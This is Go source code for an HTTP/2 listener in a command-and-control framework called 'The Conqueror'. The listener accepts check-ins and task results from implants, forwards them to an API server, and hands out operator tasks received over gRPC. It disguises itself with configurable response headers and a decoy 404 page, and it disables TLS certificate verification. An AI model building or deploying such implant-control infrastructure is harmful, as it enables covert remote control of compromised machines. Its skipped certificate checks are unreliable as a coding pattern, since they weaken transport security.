package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"github.com/gorilla/mux"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"

	"../../helpers"
	"../../messages"
	"../../protobuf"
)


// Describe an http2 listener
type http2Listener struct {
	UUID					uuid.UUID
	APIAddress  			string
	localAddress 			string
	configurationFilePath 	string
	httpClient 				*http.Client
	httpServer   			http.Server
	activeTasks				chan messages.Task
	completedTasks			chan messages.Task
	beaconTime 				time.Duration
	getResponseHeaders      map[string]interface{}
	postResponseHeaders     map[string]interface{}
	hasImplant              bool // Variable to check if the listener has an implant associated with
	notFoundFilePath        string
	gRPCServerAddress       string
}

// Get command line options
func getOptions() (string, string, string, string) {
	configFilePath := flag.String("c", "../../config/listener_template.json", "Configuration file path")
	certPath := flag.String("t", "../../certs/listener/listener.crt", "Path to the TLS certificate")
	certKey := flag.String("k", "../../certs/listener/listener.key", "Path to the TLS private key")
	caPath := flag.String("a", "../../certs/ca/ca.crt", "Path to the CA certificate")
	
	flag.Parse()

	return *configFilePath, *certPath, *certKey, *caPath
}

// Main function
func main() {

	configurationFilePath, certificatePath, certificateKey, caPath := getOptions()
	
	if configurationFilePath == "" {
		helpers.ExitOnError("Please insert the path to the template file")
	}

	if certificatePath == "" {
		helpers.ExitOnError("Please insert the path to the TLS certificate")
	}
	if certificateKey == "" {
		helpers.ExitOnError("Please insert the path to the TLS Private key")
	}

	if caPath == "" {
		helpers.ExitOnError("Please insert the path to the CA certificate")
	}

	// Open the configuration JSON file
	configurationFile, err := os.Open(configurationFilePath)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// Read from file
	configBytes, err := ioutil.ReadAll(configurationFile)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// Parse the configuration file
	var configuration map[string]map[string]interface{}
	err = json.Unmarshal(configBytes, &configuration)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// Set options from config file
	endpointsName := configuration["Endpoint"]["Name"].(string)
	endpoints := strings.Split(endpointsName, ":")
	APIAddress := configuration["Options"]["APIAddress"].(string)
	localAddress := configuration["Endpoint"]["Address"].(string)
	sleepTime := configuration["Options"]["SleepTime"].(float64)
	notFoundPage := configuration["Options"]["404"].(string)
	gRPCServerAddr := configuration["Options"]["gRPCServerAddress"].(string)

	if !helpers.CheckFile(notFoundPage) {
		helpers.ExitOnError("You must set a valid path fot the 404 page")
	}
	listenerUUID := configuration["Endpoint"]["UUID"].(string)

	// Headers
	getRespHeaders := configuration["GETResponse"]
	postRespHeaders := configuration["POSTResponse"]

	// Close file
	configurationFile.Close()

	// Create the listener object
	listener := http2Listener{
		UUID:                  uuid.Must(uuid.FromString(listenerUUID)),
		APIAddress:            "https://" + APIAddress,
		localAddress:          localAddress,
		configurationFilePath: configurationFilePath,
		beaconTime:            time.Duration(sleepTime) * time.Second,
		activeTasks: 		   make(chan messages.Task, 10000),
		completedTasks: 	   make(chan messages.Task, 10000),
		getResponseHeaders:    getRespHeaders,
		postResponseHeaders:   postRespHeaders,
		hasImplant:            false,
		notFoundFilePath:      notFoundPage,
		gRPCServerAddress:     gRPCServerAddr,
	}

	// TLS Config
	certificate, err := tls.LoadX509KeyPair(certificatePath, certificateKey)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}
	// Read CA cert
	caCert, err := ioutil.ReadFile(caPath)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}
	// create cert pool
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	config := &tls.Config {
		Certificates:		[]tls.Certificate{certificate},
		MinVersion:         tls.VersionTLS12,
		NextProtos:			[]string{"h2"},
	}

	// Create router
	router := mux.NewRouter()
	endpointNum := len(endpoints)

	// HACKY way of setting multiple handlers (there must be a better way lol)
	for {
		if endpointNum <= 0 {
			break
		}
		endpointNum--
		router.HandleFunc(endpoints[endpointNum], listener.endpoint).Methods("POST", "GET")
	}

	// Not found handler
	router.NotFoundHandler = http.HandlerFunc(listener.notFound)

	// Create http server object
	listener.httpServer = http.Server {
		Addr: 		listener.localAddress,
		Handler: 	router,
		TLSConfig:  config,
	}

	// Configure the client to use client certificate
	tlsConfig := &tls.Config {
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            caCertPool,
		MinVersion:         tls.VersionTLS12,
	}

	clientTransport := &http2.Transport {
		TLSClientConfig: tlsConfig,
	}

	// Create the http client object which will be used for all requests to the server
	listener.httpClient = &http.Client {
		Transport: clientTransport,
	}

	// gRPC TLS config
	creds := credentials.NewTLS(&tls.Config{
		InsecureSkipVerify: true,
		Certificates:  		[]tls.Certificate{certificate},
		RootCAs:       		caCertPool,
	})

	// Connect to gRPC server
	conn, err := grpc.Dial(gRPCServerAddr, grpc.WithTransportCredentials(creds))
	if err != nil {
		helpers.ExitOnError(err.Error())
	}
	defer conn.Close()

	// Register gRPC service
	getTasks := protomessages.NewGetTaskForListenerClient(conn)

	// Send message to API Server that we are shutting down
	defer func() {
		request, err := http.NewRequest("DELETE", listener.APIAddress + "/api/listeners/kill/" + listenerUUID, nil)
		if err != nil {
			panic(err)
		}
		_, err = listener.httpClient.Do(request)
		if err != nil {
			panic(err)
		}
	}()

	// Start the server
	go listener.httpServer.ListenAndServeTLS(certificatePath, certificateKey)

	// Infinite loop to beacon to the API Server

	stream, err := getTasks.GetTaskForListener(context.Background(), &protomessages.UUID{Value: listenerUUID})
	// If we have an error it means we couldn't call the RPC service on the server so let's exit
	if err != nil {
		panic(err)
	}
	for {
		// Read from the stream
		tmpTask, err := stream.Recv()
		if err == io.EOF {
			fmt.Printf("EOF")
			return
		}
		if err != nil {
			helpers.NicePrinting("fail", err.Error())
			return
		}

		if tmpTask.Type == "kill listener" && !listener.hasImplant {
			panic("Killing listener")
		}

		// Convert to normal task
		task := messages.Task{
			Type:         tmpTask.Type,
			UUID:         uuid.Must(uuid.FromString(tmpTask.Uuid.Value)),
			Args:         tmpTask.Arguments,
			ListenerUUID: uuid.Must(uuid.FromString(tmpTask.ListenerUUID.Value)),
			ImplantUUID:  uuid.Must(uuid.FromString(tmpTask.ImplantUUID.Value)),
		}
		helpers.NicePrinting("info", "We have task " + task.UUID.String())
		// Add task to the channel
		listener.activeTasks <- task
	}
}

// Not found handler
func (listener *http2Listener) notFound(writer http.ResponseWriter, request *http.Request) {
	writer.WriteHeader(404)
	file, err := os.Open(listener.notFoundFilePath)
	if err != nil {
		return
	}
	defer file.Close()

	// Read from file
	configBytes, err := ioutil.ReadAll(file)
	if err != nil {
		return
	}
	writer.Write(configBytes)
}

// Endpoint for implant check in
func (listener *http2Listener) endpoint(writer http.ResponseWriter, request *http.Request) {

	switch request.Method {
	case "POST":
		listener.setResponseHeaders(writer, "POST")
		decoder := json.NewDecoder(request.Body)
		var implantMessage messages.C2Message
		err := decoder.Decode(&implantMessage)
		if err != nil {
			fmt.Println(err)
			writer.WriteHeader(400)
			return
		}
		// Set the listener type
		implantMessage.ListenerType = "http2"
		switch implantMessage.Type {
		// Just proxy the message
		case "first checkin":
			// The implant has checked in
			listener.hasImplant = true

			// Send the response
			response, err := listener.doPost("/api/implants", implantMessage)
			if err != nil {
				writer.WriteHeader(500)
				fmt.Println("ERROR" ,err)
				break
			}
			defer response.Body.Close()
			if response.StatusCode != 200 {
				writer.WriteHeader(500)
				color.Red("Failed to send message to the API server")
				break
			}
			// Send 200 to implant if everything went well
			writer.WriteHeader(200)

		case "result":
			// Take result
			response, err := listener.doPost("/api/implants", implantMessage)
			if err != nil {
				writer.WriteHeader(500)
				fmt.Println("ERROR", err)
				break
			}
			if response.StatusCode != 200 {
				writer.WriteHeader(500)
				color.Red("Failed to send message to the API Server")
				break
			}
			writer.WriteHeader(200)
		}
	case "GET":
		listener.setResponseHeaders(writer, "GET")
		// Check if there are any active tasks
		if len(listener.activeTasks) == 0 {
			writer.WriteHeader(204)
			break
		}
		// Get the task out of the channel
		task := <- listener.activeTasks

		// Marshal and Send
		JSONTask, err := json.Marshal(task)
		if err != nil {
			writer.WriteHeader(500)
			break
		}
		writer.WriteHeader(200)
		writer.Write(JSONTask)

		// Check if the task is to kill the listener
		if task.Type == "kill listener" {
			fmt.Println("Killing listener")
			os.Exit(0)
		}

	default:
		writer.WriteHeader(405)
	}
}

// Method to perform a POST request
func (listener *http2Listener) doPost(path string, message interface{}) (*http.Response, error) {

	buffer := new(bytes.Buffer)
	err := json.NewEncoder(buffer).Encode(message)
	if err != nil {
		return nil, err
	}

	// Create a new request object
	request, err := http.NewRequest("POST", listener.APIAddress + path, buffer)
	if err != nil {
		return nil, err
	}
	// Set the headers
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", "The Conqueror listener v0.1.0")
	// Send the request
	response, err := listener.httpClient.Do(request)

	if err != nil {
		helpers.NicePrinting("fail", "Failed to send the request")
		return nil, err
	}

	return response, nil
}

// Method to add response headers
func (listener *http2Listener) setResponseHeaders(writer http.ResponseWriter, method string) {
	switch method{
	case "GET":
		for index, value := range listener.getResponseHeaders {
			writer.Header().Set(index, value.(string))
		}
	case "POST":
		for index, value := range listener.postResponseHeaders {
			writer.Header().Set(index, value.(string))
		}
	}
}

